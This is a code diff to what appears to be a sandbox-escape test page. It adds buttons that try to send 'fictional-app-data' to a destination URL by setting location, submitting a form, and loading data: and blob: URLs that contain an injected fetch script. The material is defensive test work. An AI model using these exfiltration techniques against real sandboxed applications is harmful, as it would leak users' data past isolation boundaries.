@@ -48,11 +48,6 @@ const frame = document.createElement("iframe");
 frame.src = destination + "/frame";
 root.append(frame);
 results.popup = window.open(destination + "/popup") === null;
-const form = document.createElement("form");
-form.method = "POST";
-form.action = destination + "/form";
-root.append(form);
-form.submit();
 for (const method of [
 	"fs.read",
 	"outputs.write",
@@ -113,9 +108,35 @@ const report = document.createElement("pre");
 report.id = "escape-results";
 report.textContent = JSON.stringify(results);
 root.append(report);
-const navigate = document.createElement("button");
-navigate.textContent = "Probe self navigation";
-navigate.onclick = () => {
-	location.href = destination + "/navigation?data=fictional";
-};
-root.append(navigate);
+// Each of these navigates the guest frame itself, so the spec runs one per load.
+const leak = "fictional-app-data";
+const exfiltrate = `<script>fetch(${JSON.stringify(destination + "/inner?data=" + leak)})</script>`;
+for (const [name, navigate] of Object.entries({
+	location: () => {
+		location.href = destination + "/navigation?data=" + leak;
+	},
+	form: () => {
+		const form = document.createElement("form");
+		form.method = "POST";
+		form.action = destination + "/form";
+		const field = document.createElement("input");
+		field.name = "data";
+		field.value = leak;
+		form.append(field);
+		root.append(form);
+		form.submit();
+	},
+	data: () => {
+		location.href = "data:text/html," + encodeURIComponent(exfiltrate);
+	},
+	blob: () => {
+		location.href = URL.createObjectURL(
+			new Blob([exfiltrate], { type: "text/html" }),
+		);
+	},
+})) {
+	const button = document.createElement("button");
+	button.textContent = "Navigate " + name;
+	button.onclick = navigate;
+	root.append(button);
+}
